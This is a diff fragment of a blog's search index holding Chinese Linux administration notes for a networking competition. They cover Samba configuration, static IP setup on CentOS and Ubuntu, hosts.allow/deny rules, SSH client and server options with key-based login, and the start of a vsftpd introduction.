+<h3 id="smb-conf-配置文件常用参数"><a href="#smb-conf-配置文件常用参数" class="headerlink" title="smb.conf 配置文件常用参数"></a>smb.conf 配置文件常用参数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]		#  全局配置（默认有该设置，如需要在全局下添加东西则只需在文件中该行的下面添加即可）</span><br><span class="line">config file&#x3D;&#x2F;etc&#x2F;&#x2F;samba&#x2F;%U	#  设置配置文件的绝对路径（需要在全局配置下添加）</span><br><span class="line"></span><br><span class="line">[homes]		#  用于共享用户目录（默认有该配置）</span><br><span class="line"></span><br><span class="line">[printers]	#  用于共享打印机（默认有该配置）</span><br><span class="line"></span><br><span class="line">[test]			    #  共享名</span><br><span class="line">comment &#x3D; test-test	#  该共享的说明</span><br><span class="line">path &#x3D; &#x2F;test		#  共享文件路径</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">browseable &#x3D; yes	#  可浏览</span><br><span class="line">public &#x3D; yes		#  允许 guest 账户访问</span><br><span class="line">guest ok &#x3D; yes		#  允许 guest 用户访问</span><br><span class="line">writeable &#x3D; yes		#  用户可写</span><br><span class="line">write list &#x3D; test-1,test-2	#  指定 test-1 用户跟 test-2 用户可写</span><br><span class="line">admin users &#x3D; admin         #  该共享的管理者</span><br><span class="line">valid users &#x3D; test-1,test-2		#  设置用户白名单（test-1 与 test-2 用户可访问）</span><br><span class="line">invalid users &#x3D; test-3,test-4	#  设置用户黑名单（test-3 与 test-4 用户禁止访问）</span><br><span class="line">create mode &#x3D; 0644	#  新建文件后文件的权限</span><br><span class="line">directory mode &#x3D; 0755	#  新建文件夹后文件夹的权限</span><br><span class="line">veto files &#x3D; &#x2F;*root*&#x2F;*.exe&#x2F;	#  禁止上传 *.exe 的文件跟文件名含有 root 的文件或文件夹</span><br><span class="line"></span><br><span class="line">#  日志相关</span><br><span class="line">log file &#x3D; &#x2F;var&#x2F;log&#x2F;samba&#x2F;%m.log	#  指定日志存放位置</span><br><span class="line">max log size &#x3D;10		#  设置日志文件大小（单位为：M）</span><br><span class="line"></span><br><span class="line">#  安全相关</span><br><span class="line">encrypt passwords &#x3D;yes	#  密码加密</span><br><span class="line">smb passwd file &#x3D; &#x2F;etc&#x2F;samba&#x2F;smbpasswd	#  Samba 用户密码文件存放位置</span><br><span class="line">username map &#x3D; &#x2F;etc&#x2F;samba&#x2F;smbusers      #  Samba 用户文件存放位置</span><br><span class="line">security &#x3D; share		#  安全选项（share、user、server、domain）</span><br><span class="line">	- hare：用户访问 Samba Server 不需要提供用户名和密码</span><br><span class="line">	- user：Samba Server 共享目录只能被授权的用户访问，由 Samba  Server负责检查账号和密码的正确性</span><br><span class="line">	- server：依靠其他 Wwindows NT &#x2F;2000 或 Samba Server 来验证用户名和密码</span><br><span class="line">	- domain：域安全级别，使用主域控制器（PDC）来完成验证</span><br><span class="line"></span><br><span class="line">#  打印机相关</span><br><span class="line">printable &#x3D; yes         #  打印机是否可打印（默认有该参数）</span><br><span class="line">load printers &#x3D; yes     #  当 Samba 启动时共享打印机</span><br><span class="line">printcap name &#x3D; cups	#  设置共享打印机的配置文件</span><br></pre></td></tr></table></figure>
+<h3 id="新建-Samba-用户"><a href="#新建-Samba-用户" class="headerlink" title="新建 Samba 用户"></a>新建 Samba 用户</h3><p>创建 Samba 用户需先建立对应的本地用户 <code>useradd test</code></p>
+<p>新建 test 用户：<code>smbpasswd -a test</code><br>删除 test 用户：<code>smbpasswd -x test</code><br>禁用 test 用户：<code>smbpasswd -d test</code><br>启用 test 用户：<code>smbpasswd -e test</code><br>清除 test 用户密码：<code>smbpasswd -n test</code><br>列出 samba 用户：<code>pdbedit -L</code><br>列出 samba 用户详细：<code>pdbedit -Lv</code></p>
+<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p>1、新建用户，并设置共享目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  新建本地用户 test</span><br><span class="line">useradd test</span><br><span class="line">#  新建 smb 用户 test</span><br><span class="line">smbpasswd -a test	#  此处需要设置密码</span><br><span class="line">#  设置共享目录</span><br><span class="line">mkdir &#x2F;test</span><br></pre></td></tr></table></figure>
+<p>2、编辑配置文件<br>编辑 Samba 配置文件：<code>vim /etc/samba/smb.conf</code><br>在文件内添加如下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[test]			#  共享名</span><br><span class="line">comment &#x3D; test	#  该共享的描述</span><br><span class="line">path &#x3D; &#x2F;test	#  共享的目录</span><br><span class="line">writeable &#x3D; yes	#  允许写入</span><br></pre></td></tr></table></figure>
+<p>3、重启服务<br>编辑完配置文件后重启服务即可<br>停止服务：<code>systemctl stop smb</code><br>启动服务：<code>systemctl start smb</code><br>重启服务：<code>systemctl restart smb</code><br>查看服务状态：<code>systemctl status smb</code></p>
+]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Network</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Network/Network/</url>
+    <content><![CDATA[<h2 id="一、网卡命名规范（设备类型-设备位置-数字）"><a href="#一、网卡命名规范（设备类型-设备位置-数字）" class="headerlink" title="一、网卡命名规范（设备类型 + 设备位置 + 数字）"></a>一、网卡命名规范（设备类型 + 设备位置 + 数字）</h2><p><strong>设备类型：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">格式</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">en</td>
+<td align="left">以太网（Ethernet）</td>
+</tr>
+<tr>
+<td align="center">ib</td>
+<td align="left">无限宽带（InfiniBand）</td>
+</tr>
+<tr>
+<td align="center">sl</td>
+<td align="left">串列线路互联网协议（slip：Serial line IP）</td>
+</tr>
+<tr>
+<td align="center">wl</td>
+<td align="left">无线局域网（WLAN）</td>
+</tr>
+<tr>
+<td align="center">www</td>
+<td align="left">无线广域网（WWAN）</td>
+</tr>
+</tbody></table>
+<p><strong>设备位置：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">格式</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">o</td>
+<td align="left">集成设备</td>
+</tr>
+<tr>
+<td align="center">s</td>
+<td align="left">扩展槽的索引号</td>
+</tr>
+<tr>
+<td align="center">x</td>
+<td align="left">基于 MAC 进行命名</td>
+</tr>
+<tr>
+<td align="center">p</td>
+<td align="left">PCI 扩展总线</td>
+</tr>
+</tbody></table>
+<p><strong>实例：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">格式</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">eth0</td>
+<td align="left">默认的网卡名</td>
+</tr>
+<tr>
+<td align="left">eno1</td>
+<td align="left">主板 BIOS 内置的网卡</td>
+</tr>
+<tr>
+<td align="left">ens1</td>
+<td align="left">主板 BIOS 内置的 PCI 网卡（PCI：主板上的一个插槽）</td>
+</tr>
+<tr>
+<td align="left">enp0s2</td>
+<td align="left">PCI 独立网卡（PCI：主板上的一个插槽）</td>
+</tr>
+<tr>
+<td align="left">wlp3s0</td>
+<td align="left">PCI 无线网卡（PCI：主板上的一个插槽）</td>
+</tr>
+<tr>
+<td align="left">wwp0s29f7u2i2</td>
+<td align="left">4G modem</td>
+</tr>
+<tr>
+<td align="left">wlp0s2f1u4u1</td>
+<td align="left">连接在 USB Hub 上的无线网卡</td>
+</tr>
+<tr>
+<td align="left">enx78e7d1ea46da</td>
+<td align="left">PCI 网卡（PCI：主板上的一个插槽）</td>
+</tr>
+</tbody></table>
+<h2 id="二、Centos-配置静态-IP"><a href="#二、Centos-配置静态-IP" class="headerlink" title="二、Centos 配置静态 IP"></a>二、Centos 配置静态 IP</h2><p>Centos7 默认网络配置文件路径为：<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code> （有一些默认文件则是 <code>ifcfg-ens33</code> 或是其他的）</p>
+<p>1、编辑配置文件 <code>ifcfg-eth0</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  在文件中找到如下内容</span><br><span class="line">BOOTPROTO&#x3D;dhcp		    #  将文件中的这行修改为 static</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;no	#  将文件中的这行修改为 yes</span><br><span class="line">ONBOOT&#x3D;no   			#  将文件中的这行修改为 yes</span><br><span class="line"></span><br><span class="line">#  在文件末尾添加如下内容</span><br><span class="line">IPADDR&#x3D;10.1.82.232	    #  网卡 IP</span><br><span class="line">NETMASK&#x3D;255.255.255.0	#  子网掩码</span><br><span class="line">GATEWAY&#x3D;10.1.82.254		#  网关</span><br><span class="line">DNS1&#x3D;8.8.8.8			#  首选 DNS</span><br></pre></td></tr></table></figure>
+<p>2、<code>ifcfg-eth0</code> 文件详解</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TYPE&#x3D;Ethernet			#  网卡类型</span><br><span class="line">PROXY_METHOD&#x3D;none		#  代理方式（默认关闭）</span><br><span class="line">BROWSER_ONLY&#x3D;no		    #  代理设置是否仅用于浏览器</span><br><span class="line">BOOTPROTO&#x3D;static		#  网卡的引导协议（static：静态 IP，dhcp：动态 IP，none：不启用）</span><br><span class="line">DEFROUTE&#x3D;yes			#  默认路由</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;yes	#  是否开启 IPV4 致命错误检测</span><br><span class="line">IPV6INIT&#x3D;yes			#  IPV6 是否自动初始化</span><br><span class="line">IPV6_AUTOCONF&#x3D;yes		#  IPV6 是否自动配置</span><br><span class="line">IPV6_DEFROUTE&#x3D;yes		#  IPV6 是否可以为默认路由</span><br><span class="line">IPV6_FAILURE_FATAL&#x3D;no	#  是否开启 IPV6 致命错误检测</span><br><span class="line">IPV6_ADDR_GEN_MODE&#x3D;stable-privacy		#  IPV6 地址生成模型</span><br><span class="line">NAME&#x3D;eth0</span><br><span class="line">UUID&#x3D;b3942c00-c0e4-45e8-8e4d-f1dd06ab9a09	#  统用唯一识别码（不能跟其他 UUID 重复）</span><br><span class="line">DEVICE&#x3D;eth0			#  网卡名称</span><br><span class="line">ONBOOT&#x3D;yes			#  是否开机自启</span><br><span class="line"></span><br><span class="line">IPADDR&#x3D;10.1.82.232	    #  网卡 IP</span><br><span class="line">NETMASK&#x3D;255.255.255.0	#  子网掩码</span><br><span class="line">GATEWAY&#x3D;10.1.82.254		#  网关</span><br><span class="line">DNS1&#x3D;8.8.8.8			#  首选 DNS</span><br></pre></td></tr></table></figure>
+<p>3、配置完后需重启服务<br>重启网络：<code>systemctl restart network</code><br>停止：<code>systemctl stop network</code><br>开启：<code>systemctl start network</code><br>查看状态：<code>systemctl status network</code></p>
+<h2 id="三、Ubuntu-配置静态-IP"><a href="#三、Ubuntu-配置静态-IP" class="headerlink" title="三、Ubuntu 配置静态 IP"></a>三、Ubuntu 配置静态 IP</h2><p>1、如配置文件路径为 <code>/etc/network/interfaces／interfaces</code>，则在文件末尾添加如下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  添加网卡 eth0 并设置为 static（静态 IP）模式</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.123	#  网卡 IP</span><br><span class="line">netmask 255.255.255.0	#  子网掩码</span><br><span class="line">gateway 192.168.1.1	#  网关</span><br><span class="line">dns 114.114.114.114	#  dns</span><br></pre></td></tr></table></figure>
+<p>配置完成后需重启服务<br>重启网络：<code>sudo systemctl restart network</code><br>停止：<code>sudo systemctl stop network</code><br>开启：<code>sudo systemctl start network</code><br>查看状态：<code>sudo systemctl status network</code></p>
+<p>２、如配置文件路径为：<code>/etc/netplan/01-network-manager-all.yaml</code>，则在文件末尾添加如下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">静态 IP 配置文件内容如下：</span><br><span class="line">network:</span><br><span class="line">    version: 2</span><br><span class="line">    renderer: NetworkManager</span><br><span class="line">    ethernets:</span><br><span class="line">        ens33:		#  配置的网卡名称（可使用 ip a 查看）</span><br><span class="line">            dhcp4: no		#  dhcp4关闭</span><br><span class="line">            dhcp6: no</span><br><span class="line">            addresses: [192.168.1.233&#x2F;23]	#  IP及掩码</span><br><span class="line">            gateway4: 192.168.0.1	#  网关</span><br><span class="line">            nameservers:</span><br><span class="line">                 addresses: [114.114.114.114,180.76.76.76]</span><br><span class="line"></span><br><span class="line">动态 IP 配置文件内容如下：</span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">     ens33:     # 配置的网卡名称（可使用 ip a 查看）</span><br><span class="line">       dhcp4: true      # dhcp4开启</span><br><span class="line">       addresses: []    # 设置本机IP及掩码，空</span><br><span class="line">       optional: true</span><br></pre></td></tr></table></figure>
+<p>使配置生效命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>
+<p>如果配置生效后旧 IP 依然存在则使用命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ip addr flush dev ens33</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup ens33</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hosts.allow、Hosts.deny 文件</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/hosts.allow%E6%96%87%E4%BB%B6%E8%B7%9Fhosts.deny%E6%96%87%E4%BB%B6/hosts.allow%E3%80%81hosts.deny/</url>
+    <content><![CDATA[<p><strong>文件优先级：</strong> <code>先 deny，后 allow，如有冲突则按 allow 文件内的规则处理</code></p>
+<h2 id="hosts-allow-文件"><a href="#hosts-allow-文件" class="headerlink" title="hosts.allow 文件"></a>hosts.allow 文件</h2><p>hosts.allow 文件内的内容为允许服务列表<br>默认路径：<code>/etc/hosts.allow</code><br>格式：<code>服务名 + IP + allow</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshd:all:allow      #  允许所有主机</span><br><span class="line">sshd:192.168.1.:allow       #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:allow      #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:allow   #  允许 1.0 网段的所有主机</span><br></pre></td></tr></table></figure>
+
+<h2 id="hosts-deny-文件"><a href="#hosts-deny-文件" class="headerlink" title="hosts.deny 文件"></a>hosts.deny 文件</h2><p>hosts.deny 文件内的内容为拒绝服务列表<br>默认路径：<code>/etc/hosts.deny</code><br>格式：<code>服务名 + IP + deny</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshd:all:deny       #  拒绝所有主机</span><br><span class="line">sshd:192.168.1.:deny        #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:deny       #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:deny    #  拒绝 1.0 网段的所有主机</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSH</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/ssh/ssh/</url>
+    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSH 是为远程登陆会话和其他网络服务提供安全性的协议</p>
+<p>默认端口号为：<code>22</code><br>客户端配置文件：<code>/etc/ssh/ssh_config</code><br>服务端配置文件：<code>/etc/ssh/sshd_config</code></p>
+<h2 id="二、ssh-config"><a href="#二、ssh-config" class="headerlink" title="二、ssh_config"></a>二、ssh_config</h2><p><code>ssh_config</code> 配置文件常用参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host *			#  有效的主机（多个主机可用空格隔， “*” 表示所有）</span><br><span class="line">ForwardAgent no	#  连接是否经过代理验证（如果是）转发给远程计算机</span><br><span class="line">ForwardX11 no	#  连接受否被自动重定向到安全的通道和显示集</span><br><span class="line">RhostsRSAAuthentication no	#  不使用 RSA 算法基于 rhosts 的安全验证（仅 Version 1 版本使用）</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">PasswordAuthentication yes	#  使用口令验证</span><br><span class="line">HostbasedAuthentication no	#  与 RhostsRSAAuthentication 类似（Version2 使用）。</span><br><span class="line">GSSAPIAuthentication no		#  是否允许使用基于 GSSAPI 的用户认证（默认值为 ”yes”，仅用于 Version2）</span><br><span class="line">BatchMode no			#  如为 “yes“，passphrase&#x2F;password（交互式输入口令）的提示将被禁止</span><br><span class="line">CheckHostIP yes			#  设置 SSH 是否检查看连接到服务器的主机的 IP 地址以防止 DNS 欺骗（建议设置为 “yes“）</span><br><span class="line">AddressFamily any		#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ConnectTimeout 0		#  设置连接超时时间</span><br><span class="line">StrictHostKeyChecking ask       #  如果设置为 ”yes“，则不会自动把计算机的密钥加入 ”HOME&#x2F;.ssh&#x2F;known_hosts&quot; 文件，并且以一旦计算机的密钥发生了变化，就拒绝连接</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;identity	#  设置从哪个文件读取用户的 RSA 安全验证标识</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ecdsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ed25519</span><br><span class="line">Port 22			#  设置端口号</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">Cipher 3des		#  设置加密用的密码</span><br><span class="line">Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc	#  指定 Version2 使用的加密算法（多个算法之间使用逗号分隔）</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160	#  制定允许在 Version2 中使用哪些消息摘要算法来进行数据校验</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="三、sshd-config"><a href="#三、sshd-config" class="headerlink" title="三、sshd_config"></a>三、sshd_config</h2><p><code>sshd_config</code> 配置文件常用参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  常用</span><br><span class="line">Port 22			#  端口号</span><br><span class="line">AddressFamily any	#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ListenAddress 0.0.0.0	#  监听地址（0.0.0.0 表示所有地址）</span><br><span class="line">ListenAddress ::		#  监听地址（IPv6 地址）</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">LogLevel INFO		#  日志等级（QUIET, FATAL, ERROR, INFO, VERBOSE, DEBUG, DEBUG1, DEBUG2, and DEBUG3）</span><br><span class="line">UserDNS no		#  禁止DNS反向解析</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">PermitRootLogin no		#  禁止root用户登录</span><br><span class="line">PermitEmptyPasswords no 	#  禁止空密码用户登录</span><br><span class="line">LoginGraceTime 2m	#  登录验证时间为2分钟</span><br><span class="line">MaxAuthTries 6		#  最大重试次数6次</span><br><span class="line">AllowUsers steven	#  只允许 steven 用户登录</span><br><span class="line">DenyUsers steven	#  不允许登录用户 steven</span><br><span class="line"></span><br><span class="line">#  验证</span><br><span class="line">PasswordAuthentication yes	#  启用密码验证（如配置密钥登录，则需关闭此项）</span><br><span class="line">PubkeyAuthentication yes		#  启用密匙验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys		#  指定公钥数据库文件（用于密钥登陆）</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh 是 openssh 套件中的客户端连接工具</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-A	#  开启认证代理连接转发功能</span><br><span class="line">-a	#  关闭认证代理连接转发功能</span><br><span class="line">-b	#  使用本机指定地址作为对应连接的源 IP 地址</span><br><span class="line">-C	#  请求压缩所有数据</span><br><span class="line">-F	#  指定 ssh 指令的配置文件</span><br><span class="line">-f	#  后台执行 ssh 指令</span><br><span class="line">-g	#  允许远程主机连接主机</span><br><span class="line">-i	#  指定身份文件</span><br><span class="line">-l	#  指定连接远程服务器登陆用户名</span><br><span class="line">-N	#  不执行远程指令</span><br><span class="line">-o	#  指定配置选项</span><br><span class="line">-p	#  指定远程服务器的端口</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-X	#  开启 X11 转发功能</span><br><span class="line">-x	#  关闭 X11 转发功能</span><br><span class="line">-y	#  开启信任 X11 转发功能</span><br></pre></td></tr></table></figure>
+<h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h3><p>ssh-keygen 命令用于为 ssh 生成、管理和转换认证密钥</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh-keygene 常用参数</span><br><span class="line">-C	#  添加注释</span><br><span class="line">-b	#  指定密钥长度</span><br><span class="line">-e	#  读取openssh 的私钥或公钥文件</span><br><span class="line">-f	#  指定用来保存密钥的文件名</span><br><span class="line">-i	#  读取未加密的 ssh-v2 兼容的私钥&#x2F;公钥文件，然后在标准输出设备上显示 openssh 见阿荣的私钥&#x2F;公钥</span><br><span class="line">-l	#  显示公钥文件的指纹数据</span><br><span class="line">-N	#  提供一个新密码</span><br><span class="line">-P	#  提供一个旧密码</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-t	#  指定要创建的密钥类型（RSA、DSA，默认为 RSA）</span><br></pre></td></tr></table></figure>
+<h3 id="ssh-cocpy-id"><a href="#ssh-cocpy-id" class="headerlink" title="ssh-cocpy-id"></a>ssh-cocpy-id</h3><p>ssh-copy-id 命令用于把本地主机的公钥复制到远程主机的 /root/.ssh/authorized_keys 文件中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-cocpy-id 常用参数</span><br><span class="line">-i	#  指定公钥文件</span><br></pre></td></tr></table></figure>
+<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>加密的方式在本地的主机和远程主机之间复制文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  scp 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-B	#  以批处理模式运行</span><br><span class="line">-C	#  使用压缩</span><br><span class="line">-F	#  指定 ssh 配置文件</span><br><span class="line">-i	#  identity_file 从指定文件中读取传输时使用的密钥文件</span><br><span class="line">-l	#  指定宽带限制</span><br><span class="line">-o	#  指定使用的 ssh 选项</span><br><span class="line">-P	#  指定远程主机的端口号</span><br><span class="line">-p	#  保留文件的最后修改时间，最后访问时间和权限模式</span><br><span class="line">-q	#  不显示复制进度</span><br><span class="line">-r	#  以递归方式复制</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="五、配置密钥登陆"><a href="#五、配置密钥登陆" class="headerlink" title="五、配置密钥登陆"></a>五、配置密钥登陆</h2><h3 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改服务端配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PasswordAuthentication no	#  关闭密码验证</span><br><span class="line">PubkeyAuthentication yes	#  启用密钥验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br></pre></td></tr></table></figure>
+<h3 id="2、在客户端生成密钥"><a href="#2、在客户端生成密钥" class="headerlink" title="2、在客户端生成密钥"></a>2、在客户端生成密钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">    指定私钥保存的路径及文件名（如不指定则默认为 &#x2F;root&#x2F;.ssh&#x2F;id_rsa）</span><br><span class="line">    密钥密码，最少五个字符（用于密钥连接时候使用，如不输入则可免密登陆）</span><br><span class="line">    确认密码</span><br><span class="line">    确完后自动在密钥文件所在位置创建 .pub 的公钥文件</span><br><span class="line"></span><br><span class="line">#  文件简介</span><br><span class="line">id_rsa		#  私钥文件</span><br><span class="line">id_rsa.pub	#  公钥文件</span><br><span class="line">authorized_keys	#  服务端公钥文件</span><br><span class="line">known_hosts	#  确认过公钥指纹的可信服务器列表的文件</span><br><span class="line">config		#  指定不同域名使用哪个密钥的配置文件</span><br></pre></td></tr></table></figure>
+<h3 id="3、上传公钥到服务端"><a href="#3、上传公钥到服务端" class="headerlink" title="3、上传公钥到服务端"></a>3、上传公钥到服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i id_rsa.pub root@192.168.1.123	#  将公钥上传到服务器（会自动在服务器 &#x2F;root&#x2F;.ssh&#x2F; 目录下创建 authorized_keys 文件）</span><br><span class="line"></span><br><span class="line">#  如前一行报错则可用 scp 命令拷贝</span><br><span class="line">#  将 .11 主机上的 id_rsa.pub 拷贝到指定目录并更名为 authorized_keys（服务端输入）</span><br><span class="line">scp -P 2222 root@10.1.82.11:&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">#  或</span><br><span class="line">#  将本地主机上的 id_rsa.pub 文件拷贝到 .11 主机上并更名为 authorized_keys（客户端输入）</span><br><span class="line">scp -P 2222 &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@10.1.82.12:&#x2F;root&#x2F;.ssh&#x2F;authorized_keys </span><br></pre></td></tr></table></figure>
+<h3 id="4、连接"><a href="#4、连接" class="headerlink" title="4、连接"></a>4、连接</h3><p>如设置了公钥密码则需输入公钥密码，如没设置公钥密码则可免密登陆</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 2222 root@192.168.1.123</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VSFTP</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/</url>
+    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>用户以文件操作的方式（如文件的增、删、改、查、传递等）与另一主机互相通信</p>
+<p><code>ftp</code> 有 <code>ASCII</code> 模式与 <code>Binary</code>（二进制） 模式</p>
+<ul>
+<li><code>ASCII</code> 模式用来传递 <code>HTML</code> 和文本编写的文件（如用 <code>Binary</code> 模式传递则会破坏-文件，导致文件执行出错）</li>
+<li><code>Binary</code> 模式用来传递可执行文件，压缩文件，和图片文件（如用 <code>ASCII</code> 模式传递，则会乱码）</li>
+</ul>
+<p>默认端口号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">控制：21</span><br><span class="line">传输：20</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 vsftp <code>yum -y install vsftpd</code></p>
+<p>默认配置文件 <code>/etc/vsftpd/vsftpd.conf</code></p>
+<p>PAM 认证配置文件路径 <code>/etc/pam.d</code></p>
+<p><code>vsftpd.conf</code> 配置文件常用参数：</p>
